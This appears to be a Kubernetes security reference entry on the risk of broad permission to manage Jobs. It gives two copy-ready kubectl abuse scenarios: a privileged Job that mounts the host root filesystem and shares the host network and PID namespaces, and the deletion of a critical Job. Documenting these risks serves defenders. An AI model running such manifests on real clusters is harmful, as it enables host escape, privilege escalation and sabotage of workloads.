## Description

Allows creating, updating, or deleting Jobs across all namespaces. Jobs create one or more pods for batch tasks. This can be used to run a one-off pod with privileged settings, leading to code execution, privilege escalation, and tampering.

## Abuse Scenarios

1. Create a new Job that runs a privileged pod once.

```bash {copy=true}
kubectl create -n <namespace> -f - <<EOF
apiVersion: batch/v1
kind: Job
metadata:
  name: privileged-job
spec:
  template:
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: attacker
        image: busybox
        command: ["/bin/sh", "-c", "echo 'Job Pwned!' > /host/job_pwned.txt"]
        securityContext:
          privileged: true
        volumeMounts:
        - mountPath: /host
          name: host-root
      volumes:
      - name: host-root
        hostPath:
          path: /
      restartPolicy: OnFailure
EOF
# Example: kubectl create -n default -f - <<EOF ... EOF

```

2. Delete a critical Job, preventing a one-off task from completing.

```bash {copy=true}
kubectl delete job <job-name> -n <namespace>
# Example: kubectl delete job db-migration-job -n production

```
